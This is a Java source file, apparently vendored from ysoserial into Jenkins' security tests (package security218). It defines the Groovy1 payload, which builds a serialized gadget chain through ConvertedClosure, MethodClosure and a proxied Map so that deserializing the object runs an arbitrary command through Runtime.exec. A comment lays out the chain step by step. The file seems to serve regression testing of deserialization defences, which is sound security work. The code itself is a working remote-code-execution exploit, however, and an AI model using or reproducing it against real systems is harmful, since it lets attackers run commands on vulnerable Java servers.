/*
 * The MIT License
 *
 * Copyright (c) 2013 Chris Frohoff
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package jenkins.security.security218.ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.Map;
import jenkins.security.security218.ysoserial.util.Gadgets;
import jenkins.security.security218.ysoserial.util.PayloadRunner;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;


/*
	Gadget chain:	
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				Comparator.compare() (Proxy)
					ConvertedClosure.invoke()
						MethodClosure.call()
							...
						  		Method.invoke()
									Runtime.exec()
	
	Requires:
		groovy
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObject(final String command) throws Exception {
		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");
		
		final Map map = Gadgets.createProxy(closure, Map.class);		

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);
		
		return handler;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Groovy1.class, args);
	}	
}
